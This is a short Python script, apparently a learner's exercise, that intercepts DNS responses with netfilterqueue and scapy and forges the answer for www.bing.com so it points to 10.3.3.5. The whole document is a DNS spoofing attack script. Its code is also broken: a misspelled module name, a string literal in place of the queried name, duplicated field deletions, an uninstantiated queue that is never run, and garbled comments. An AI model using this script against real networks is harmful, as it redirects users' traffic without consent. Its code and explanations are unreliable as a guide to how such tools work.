#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())## scapu.IP  this is converting ip packets.
    if scapy_packet.haslayer(scapy.DNSRR): ### this is a a filter DNS requests.
      qname = scapy_packet[scapy.DNSQR].qname ## this is showing DNS qustioin table
      if "www.bing.com" in qname:
          print("spoffing target\n")
          answer = scape.DNSRR(rname="qname",rdata="10.3.3.5")
          scapy_packet[scape.DNS].an = answer
          scapy_packet[scape.DNS].ancount = 1 ### this is a four fields.
          
          del scapy_packet[scapy.IP].len
          del scapy_packet[scapy.IP].chksum
          del scapy_packet[scapy.IP].chksum
          del scapy_packet[scapy.IP].len  # this is not intercepting the data.for another packets.
          packet.set_payload(str(scapy_packet)) ## this is a using str for modified of packet. and this is a a set payload. this is convert scapy packet in normal packet.
        
        
      print(scapy_packet.show()) 
    packet.accept()
queue = netfilterqueue.NetfilterQueue 
queue.bind(0,process_packet) 
    